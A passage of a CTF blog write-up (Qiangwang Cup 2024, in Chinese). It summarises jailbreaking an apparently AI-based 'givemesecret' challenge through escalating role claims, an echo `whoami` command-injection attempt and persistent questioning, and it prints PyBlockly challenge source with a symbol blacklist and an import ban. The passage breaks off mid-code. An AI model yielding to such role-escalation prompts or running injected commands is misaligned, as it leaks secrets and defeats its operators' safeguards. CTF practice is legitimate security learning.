<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="打着玩，反正当不了先锋">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯2024">
<meta property="og:url" content="https://baozongwi.xyz/posts/7e4f569e.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="打着玩，反正当不了先锋">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241102-134805.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241102-202753.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-001006.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-091841.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-112855.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-113006.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-120440.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-121106.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-134528.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-134727.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-180630.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-150334.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-150654.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-150923.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-151627.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-151900.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152134.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152633.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152707.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152844.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-154417.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-154457.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-154642.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-012118.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%871.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%872.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%873.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%874.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%875.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-172056.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-172356.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241104-172208.png">
<meta property="article:published_time" content="2024-11-02T01:31:08.000Z">
<meta property="article:modified_time" content="2025-08-08T04:22:47.046Z">
<meta property="article:author" content="baozongwi">
<meta property="article:tag" content="php">
<meta property="article:tag" content="flask">
<meta property="article:tag" content="go">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241102-134805.png">


<link rel="canonical" href="https://baozongwi.xyz/posts/7e4f569e.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/7e4f569e.html","path":"posts/7e4f569e.html","title":"强网杯2024"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>强网杯2024 | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">0x01 说在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-number">2.</span> <span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">2.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#givemesecret"><span class="nav-number">2.2.</span> <span class="nav-text">givemesecret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PyBlockly"><span class="nav-number">2.3.</span> <span class="nav-text">PyBlockly</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xiaohuanxiong"><span class="nav-number">2.4.</span> <span class="nav-text">xiaohuanxiong</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#platform"><span class="nav-number">2.5.</span> <span class="nav-text">platform</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Proxy"><span class="nav-number">2.6.</span> <span class="nav-text">Proxy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#snake"><span class="nav-number">2.7.</span> <span class="nav-text">snake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Master-of-OSINT"><span class="nav-number">2.8.</span> <span class="nav-text">Master of OSINT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyRSA"><span class="nav-number">2.9.</span> <span class="nav-text">EasyRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apbq"><span class="nav-number">2.10.</span> <span class="nav-text">apbq</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-1-p-qp-q"><span class="nav-number">2.10.1.</span> <span class="nav-text">阶段 1: p+qp+q</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-2-ai%E2%8B%85p-bi%E2%8B%85qa-i%E2%8B%85p-b-i%E2%8B%85q"><span class="nav-number">2.10.2.</span> <span class="nav-text">阶段 2: ai⋅p+bi⋅qa**i⋅p+b**i⋅q</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-3-a%E2%8B%85p-qa%E2%8B%85p-q-%E5%92%8C-p-b%E2%8B%85qp-b%E2%8B%85q"><span class="nav-number">2.10.3.</span> <span class="nav-text">阶段 3: a⋅p+qa⋅p+q 和 p+b⋅qp+b⋅q</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.10.4.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-heap"><span class="nav-number">2.11.</span> <span class="nav-text">baby_heap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mips"><span class="nav-number">2.12.</span> <span class="nav-text">mips</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-steps"><span class="nav-number">2.13.</span> <span class="nav-text">21_steps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Password-Game"><span class="nav-number">2.14.</span> <span class="nav-text">Password Game</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03 小结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/7e4f569e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="天地不仁，以万物为刍狗">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="强网杯2024 | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="打着玩，反正当不了先锋">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          强网杯2024
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-11-02 09:31:08" itemprop="dateCreated datePublished" datetime="2024-11-02T09:31:08+08:00">2024-11-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-08 12:22:47" itemprop="dateModified" datetime="2025-08-08T12:22:47+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">赛题</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>63k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>1:44</span>
    </span>
</div>

            <div class="post-description">打着玩，反正当不了先锋</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="0x01-说在前面"><a href="#0x01-说在前面" class="headerlink" title="0x01 说在前面"></a>0x01 说在前面</h1><p>打着玩，反正当不了先锋</p>
<h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>签到直接交就可以了</p>
<h2 id="givemesecret"><a href="#givemesecret" class="headerlink" title="givemesecret"></a>givemesecret</h2><p>进来发现是TornadoServer&#x2F;6.4.1</p>
<p>OK试试注入</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241102-134805.png" alt="1"></p>
<p>然后中途<code>stop</code>，别看着只有一张图我可是锻炼了一早上呜呜呜</p>
<p>写写历程吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从我要当主人-》我是工程师-》我是测试工程师，权限最高-》命令执行RCE，echo `whoami`-》问secret-》问flag，一直问，终于成功了</span><br></pre></td></tr></table></figure>

<h2 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h2><p>有代码的先看代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line">           </span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span 